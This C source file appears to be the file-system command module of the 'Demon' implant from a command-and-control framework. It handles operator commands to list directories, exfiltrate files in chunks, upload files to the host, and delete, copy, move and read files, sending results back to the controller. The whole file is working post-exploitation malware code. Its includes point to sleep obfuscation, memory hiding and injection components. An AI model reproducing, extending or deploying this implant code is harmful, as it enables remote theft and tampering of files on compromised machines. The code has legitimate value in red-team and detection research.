#include <Demon.h>

#include <common/Macros.h>

#include <core/Command.h>
#include <core/Token.h>
#include <core/Package.h>
#include <core/MiniStd.h>
#include <core/SleepObf.h>
#include <core/Download.h>
#include <core/Dotnet.h>
#include <core/Kerberos.h>
#include <core/Runtime.h>
#include <core/CoffeeLdr.h>
#include <core/MemoryHide.h>
#include <inject/Inject.h>
#include <commands/Command_FS.h>

VOID CommandFS( PPARSER Parser )
{
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_FS );
    DWORD    Command = ParserGetInt32( Parser );

    PackageAddInt32( Package, Command );

    switch ( Command )
    {
        case DEMON_COMMAND_FS_DIR: PUTS( "FS::Dir" )
        {
            LPWSTR           TargetFolder = NULL;
            LPWSTR           Path         = NULL;
            BOOL             FileExplorer = FALSE;
            PROOT_DIR        RootDir      = NULL;
            PROOT_DIR        TmpRootDir   = NULL;
            BOOL             SubDirs      = FALSE;
            BOOL             FilesOnly    = FALSE;
            BOOL             DirsOnly     = FALSE;
            BOOL             ListOnly     = FALSE;
            LPWSTR           Starts       = NULL;
            LPWSTR           Contains     = NULL;
            LPWSTR           Ends         = NULL;
            PDIR_OR_FILE     DirOrFile    = NULL;
            PDIR_OR_FILE     TmpDirOrFile = NULL;
            UINT32           PathSize     = 0;

            FileExplorer = ParserGetBool( Parser );
            TargetFolder = ParserGetWString( Parser, NULL );
            SubDirs      = ParserGetBool( Parser );
            FilesOnly    = ParserGetBool( Parser );
            DirsOnly     = ParserGetBool( Parser );
            ListOnly     = ParserGetBool( Parser );
            Starts       = ParserGetWString( Parser, NULL );
            Contains     = ParserGetWString( Parser, NULL );
            Ends         = ParserGetWString( Parser, NULL );

            Starts   = Starts[ 0 ]   ? Starts   : NULL;
            Contains = Contains[ 0 ] ? Contains : NULL;
            Ends     = Ends[ 0 ]     ? Ends     : NULL;

            Path = Instance->Win32.LocalAlloc( LPTR, MAX_PATH * sizeof( WCHAR ) );

            if ( TargetFolder[ 0 ] == L'.' )
            {
                if ( ! Instance->Win32.GetCurrentDirectoryW( MAX_PATH, Path ) )
                {
                    PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
                    DATA_FREE( Path, MAX_PATH * sizeof( WCHAR ) );
                    break;
                }

                PathSize = StringLengthW( Path );
                if ( Path[ PathSize - 1 ] != 0x5c )
                    Path[ PathSize++ ] = 0x5c;
                Path[ PathSize++ ] = 0x2a;
                Path[ PathSize ]   = 0x00;
            }
            else
            {
                MemCopy( Path, TargetFolder, MAX_PATH * sizeof( WCHAR ) );
            }

            PRINTF( "Path: %ls\n", Path )

            /*
             * TODO: make listDir not recursive,
             *       right now, we avoid stack overflows by iterating 10 times tops
             *       otherweise, this function is known to crash if the
             *       search space is too vast
            */
            RootDir = listDir( Path, SubDirs, FilesOnly, DirsOnly, Starts, Contains, Ends, 10 );

            PackageAddBool( Package, FileExplorer );
            PackageAddBool( Package, ListOnly );
            PackageAddWString( Package, Path );
            PackageAddBool( Package, RootDir ? TRUE : FALSE );

            while ( RootDir )
            {
                if ( ! ( ListOnly && RootDir->NumFiles + RootDir->NumFolders == 0 ) )
                {
                    PackageAddWString( Package, RootDir->Path );
                    PackageAddInt32( Package, RootDir->NumFiles );
                    PackageAddInt32( Package, RootDir->NumFolders );
                    if ( ! ListOnly ) {
                        PackageAddInt64( Package, RootDir->TotalFileSize );
                    }

                    DirOrFile = RootDir->Content;
                    while ( DirOrFile )
                    {
                        PackageAddWString( Package, DirOrFile->FileName );
                        if ( ! ListOnly ) {
                            PackageAddBool( Package, DirOrFile->IsDir );
                            PackageAddInt64( Package, DirOrFile->Size );
                            PackageAddInt32( Package, DirOrFile->FileTime.wDay );
                            PackageAddInt32( Package, DirOrFile->FileTime.wMonth );
                            PackageAddInt32( Package, DirOrFile->FileTime.wYear );
                            PackageAddInt32( Package, DirOrFile->SystemTime.wMinute );
                            PackageAddInt32( Package, DirOrFile->SystemTime.wHour );
                        }

                        TmpDirOrFile = DirOrFile->Next;
                        DATA_FREE( DirOrFile, sizeof( DIR_OR_FILE ) );
                        DirOrFile = TmpDirOrFile;
                    }
                }

                TmpRootDir = RootDir->Next;
                DATA_FREE( RootDir, sizeof( ROOT_DIR ) );
                RootDir = TmpRootDir;
            }

            DATA_FREE( Path, MAX_PATH * sizeof( WCHAR ) );

            break;
        }

        case DEMON_COMMAND_FS_DOWNLOAD: PUTS( "FS::Download" )
        {
            PDOWNLOAD_DATA Download = NULL;
            BUFFER         FileName = { 0 };
            PVOID          Buffer   = NULL;
            HANDLE         hFile    = NULL;
            BOOL           Success  = TRUE;
            WCHAR          FilePath[ MAX_PATH * 2 ] = { 0 };
            WCHAR          PathSize = MAX_PATH * 2;
            LARGE_INTEGER  FileSize = { 0 };

            Buffer = ParserGetBytes( Parser, &FileName.Length );

            FileName.Buffer = MmHeapAlloc( FileName.Length + sizeof( WCHAR ) );
            if ( ! FileName.Buffer ) {
                PUTS( "MmHeapAlloc: Failed" )
                PACKAGE_ERROR_WIN32
                Success = FALSE;
                goto CleanupDownload;
            }
            MemCopy( FileName.Buffer, Buffer, FileName.Length );

            PRINTF( "FileName => %ls\n", FileName.Buffer )

            hFile = Instance->Win32.CreateFileW( FileName.Buffer, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0 );
            if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
            {
                PUTS( "CreateFileW: Failed" )

                PACKAGE_ERROR_WIN32

                Success = FALSE;
                goto CleanupDownload;
            }

            PathSize = Instance->Win32.GetFullPathNameW( FileName.Buffer, PathSize, FilePath, NULL );
            PRINTF( "FilePath.Buffer[%d]: %ls\n", PathSize, FilePath )

            if ( ! Instance->Win32.GetFileSizeEx( hFile, &FileSize ) )
            {
                PUTS( "GetFileSizeEx: Failed" )

                PACKAGE_ERROR_WIN32

                Success = FALSE;
                goto CleanupDownload;
            }

            /* Start our download. */
            Download = DownloadAdd( hFile, FileSize.QuadPart );

            /*
			 * Download Header:
			 *  [ Mode      ] Open ( 0 ), Write ( 1 ) or Close ( 2 )
			 *  [ File ID   ] Download File ID
			 *
			 * Data (Open):
			 *  [ File Size ]
			 *  [ File Name ]
			 *
			 * Data (Write)
			 *  [ Chunk Data ] Size + FileChunk
			 *
			 * Data (Close):
			 *  [  Reason   ] Removed or Finished
			 * */

            /* Download Header */
            PackageAddInt32( Package, DOWNLOAD_MODE_OPEN );
            PackageAddInt32( Package, Download->FileID   );

            /* Download Open Data */
            PackageAddInt64( Package, FileSize.QuadPart );
            if ( PathSize > 0 )
                PackageAddWString( Package, FilePath );
            else
                PackageAddWString( Package, FileName.Buffer );

        CleanupDownload:
            PUTS( "CleanupDownload" )

            if ( FileName.Buffer )
            {
                MemSet( FileName.Buffer, 0, FileName.Length );
                MmHeapFree( FileName.Buffer );
                FileName.Buffer = NULL;
            }

            if ( ! Success )
                goto CLEAR_LEAVE;

            break;
        }

        case DEMON_COMMAND_FS_UPLOAD: PUTS( "FS::Upload" )
        {
            DWORD     FileSize  = 0;
            UINT32    NameSize  = 0;
            DWORD     Written   = 0;
            HANDLE    hFile     = NULL;
            LPWSTR    FileName  = ParserGetWString( Parser, &NameSize );
            ULONG     MemFileID = ParserGetInt32( Parser );
            PMEM_FILE MemFile   = GetMemFile( MemFileID );
            BOOL      Success   = TRUE;
            PVOID     Content   = NULL;

            // TODO: handle error and communicate to the TS

            if ( MemFile && MemFile->IsCompleted )
            {
                Content  = MemFile->Data;
                FileSize = MemFile->Size;
            }
            else if ( MemFile && ! MemFile->IsCompleted )
            {
                PRINTF( "MemFile [%x] was not completed\n", MemFileID );
                Success = FALSE;
                goto CleanupUpload;
            }
            else
            {
                PRINTF( "MemFile [%x] not found\n", MemFileID );
                Success = FALSE;
                goto CleanupUpload;
            }

            PRINTF( "FileName[%d] => %ls\n", FileSize, FileName )

            hFile = Instance->Win32.CreateFileW( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
            if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
            {
                PUTS( "CreateFileW: Failed" )
                PACKAGE_ERROR_WIN32
                Success = FALSE;
                goto CleanupUpload;
            }

            if ( ! Instance->Win32.WriteFile( hFile, Content, FileSize, &Written, NULL ) )
            {
                PUTS( "WriteFile: Failed" )
                PACKAGE_ERROR_WIN32
                Success = FALSE;
                goto CleanupUpload;
            }

            PackageAddInt32( Package, FileSize );
            PackageAddWString( Package, FileName );

        CleanupUpload:
            if ( hFile ) {
                SysNtClose( hFile );
                hFile = NULL;
            }

            if ( ! Success ) {
                goto CLEAR_LEAVE;
            }

            break;
        }

        case DEMON_COMMAND_FS_CD: PUTS( "FS::Cd" )
        {
            UINT32 PathSize = 0;
            LPWSTR Path     = ParserGetWString( Parser, &PathSize );

            if ( ! Instance->Win32.SetCurrentDirectoryW( Path ) ) {
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                goto CLEAR_LEAVE;
            } else {
                PackageAddWString( Package, Path );
            }

            break;
        }

        case DEMON_COMMAND_FS_REMOVE: PUTS( "FS::Remove" )
        {
            UINT32 PathSize = 0;
            LPWSTR Path     = ParserGetWString( Parser, &PathSize );
            DWORD  dwAttrib = Instance->Win32.GetFileAttributesW( Path );

            if ( dwAttrib != INVALID_FILE_ATTRIBUTES && ( dwAttrib & FILE_ATTRIBUTE_DIRECTORY ) )
            {
                if ( ! Instance->Win32.RemoveDirectoryW( Path ) ) {
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                    goto CLEAR_LEAVE;
                } else {
                    PackageAddInt32( Package, TRUE );
                }
            }
            else
            {
                if ( ! Instance->Win32.DeleteFileW( Path ) ) {
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                    goto CLEAR_LEAVE;
                } else {
                    PackageAddInt32( Package, FALSE );
                }
            }

            PackageAddWString( Package, Path );

            break;
        }

        case DEMON_COMMAND_FS_MKDIR: PUTS( "FS::Mkdir" )
        {
            UINT32 PathSize = 0;
            LPWSTR Path     = ParserGetWString( Parser, &PathSize );

            if ( ! Instance->Win32.CreateDirectoryW( Path, NULL ) )
            {
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                goto CLEAR_LEAVE;
            }

            PackageAddWString( Package, Path );

            break;
        }

        case DEMON_COMMAND_FS_COPY: PUTS( "FS::Copy" )
        {
            UINT32 FromSize = 0;
            UINT32 ToSize   = 0;
            LPWSTR PathFrom = NULL;
            LPWSTR PathTo   = NULL;
            BOOL   Success  = FALSE;

            PathFrom = ParserGetWString( Parser, &FromSize );
            PathTo   = ParserGetWString( Parser, &ToSize );

            PRINTF( "Copy file %ls to %ls\n", PathFrom, PathTo )

            Success = Instance->Win32.CopyFileW( PathFrom, PathTo, FALSE );
            if ( ! Success ) {
                PACKAGE_ERROR_WIN32
            }

            PackageAddInt32( Package, Success );
            PackageAddWString( Package, PathFrom );
            PackageAddWString( Package, PathTo );

            break;
        }

        case DEMON_COMMAND_FS_MOVE: PUTS( "FS::Move" )
        {
            UINT32 FromSize = 0;
            UINT32 ToSize   = 0;
            LPWSTR PathFrom = NULL;
            LPWSTR PathTo   = NULL;
            BOOL   Success  = FALSE;

            PathFrom = ParserGetWString( Parser, &FromSize );
            PathTo   = ParserGetWString( Parser, &ToSize );

            PRINTF( "Move file %ls to %ls\n", PathFrom, PathTo )

            Success = Instance->Win32.MoveFileExW( PathFrom, PathTo, MOVEFILE_REPLACE_EXISTING );
            if ( ! Success ) {
                PACKAGE_ERROR_WIN32
            }

            PackageAddInt32( Package, Success );
            PackageAddWString( Package, PathFrom );
            PackageAddWString( Package, PathTo );

            break;
        }

        case DEMON_COMMAND_FS_GET_PWD: PUTS( "FS::GetPwd" )
        {
            WCHAR Path[ MAX_PATH * 2 ] = { 0 };
            DWORD Return               = 0;

            if ( ! ( Return = Instance->Win32.GetCurrentDirectoryW( MAX_PATH * 2, Path ) ) ) {
                PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
            } else {
                PackageAddWString( Package, Path );
            }

            break;
        }

        case DEMON_COMMAND_FS_CAT: PUTS( "FS::Cat" )
        {
            DWORD  FileSize = 0;
            UINT32 NameSize = 0;
            LPWSTR FileName = ParserGetWString( Parser, &NameSize );
            PVOID  Content  = NULL;
            BOOL   Success  = FALSE;

            PRINTF( "FileName => %ls\n", FileName )

            Success = ReadLocalFile( FileName, &Content, &FileSize );

            PackageAddWString( Package, FileName );
            PackageAddInt32( Package, Success );
            PackageAddBytes( Package, Content,  FileSize );

            if ( Content )
            {
                MemSet( Content, 0, FileSize );
                Instance->Win32.LocalFree( Content );
                Content = NULL;
            }
            break;
        }

        default:
        {
            PRINTF( "FS SubCommand not found: %d : %x\n", Command, Command );
            break;
        }
    }

    PackageTransmit( Package );
    return;

CLEAR_LEAVE:
    PackageDestroy( Package ); Package = NULL;
}
